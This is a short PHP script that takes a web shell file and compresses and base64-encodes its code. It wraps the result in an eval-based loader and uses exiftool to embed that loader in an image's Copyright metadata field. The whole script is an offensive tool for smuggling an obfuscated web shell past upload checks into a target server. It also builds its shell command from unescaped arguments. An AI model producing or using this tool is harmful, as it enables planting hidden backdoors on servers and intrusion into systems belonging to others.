<?php
    $shell_path = $argv[1];
    $image_path = $argv[2];

    $code = file_get_contents($shell_path);
    $code = str_replace("<?php", "", str_replace("?>", "", $code));
    $data = gzcompress($code);
    $b64 = base64_encode($data);
    $code = "<?php eval(gzuncompress(base64_decode('$b64'))); ?>";
    echo "$code\n";

    $command = "exiftool -Copyright=\"$code\" -overwrite_original $image_path";
    shell_exec($command);
?>